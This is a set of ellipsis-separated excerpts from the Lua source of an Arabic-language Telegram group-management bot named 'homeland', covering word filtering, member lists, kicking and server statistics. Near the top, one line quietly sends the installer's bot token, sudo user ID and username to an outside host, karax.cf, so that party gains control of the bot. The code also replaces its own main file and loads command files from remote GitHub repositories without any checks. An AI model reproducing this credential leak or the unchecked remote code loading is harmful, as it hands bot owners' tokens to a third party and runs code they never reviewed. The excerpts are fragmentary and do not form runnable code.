...
https.request('http://karax.cf/homeland/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./homeland.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("QW", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S homeland -X kill
screen -S homeland ./homeland
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/homelandTEAM/Files_homeland/master/File_Bot/commands.lua") 
...
send(msg.chat_id_, msg.id_,homeland_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local homeland1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..homeland1.server.uptime_in_days..'('..homeland1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..homeland1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..homeland1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..homeland1.stats.instantaneous_ops_per_sec..'`\n'
...
local homeland1_Msg = database:get(bot_id.."homeland1:Add:Filter:Rp2"..text..msg.chat_id_)   
if homeland1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
os.execute('rm -rf homeland.lua')
os.execute('wget https://raw.githubusercontent.com/homelandTEAM/homeland/master/homeland.lua')
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/homelandTEAM/Files_homeland/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/CowleyIQ/files_COWLEY/master/File_Bot/"..file)
if res == 200 then
...
database:set(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."homeland1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."homeland1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."homeland1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."homeland1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."homeland1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."homeland1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."homeland1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."homeland1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."homeland1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."homeland1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."homeland1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local homeland_Msg = database:get(bot_id.."homeland1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..homeland_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..homeland_Msg[math.random(#homeland_Msg)]..']') 
return false
end
...
},function(ta,homeland)
local t = "\n🔘| قائمة الاعضاء \n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉\n"
x = 0
local list = homeland.members_
for k, v in pairs(list) do
x = x + 1
...
homeland = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(homeland)
...
--------------------------------------------------------------------------------------------------------------
Sourcehomeland(data.message_,data)
...
------------------------------------------------------------------------
local homelandAbot = database:get(bot_id.."homeland1:Add:Filter:Rp2"..text..result.chat_id_)   
if homelandAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..homelandAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local homeland1_Msg = database:get(bot_id.."homeland1:Add:Filter:Rp2"..text..result.chat_id_)   
if homeland1_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..homeland1_Msg)
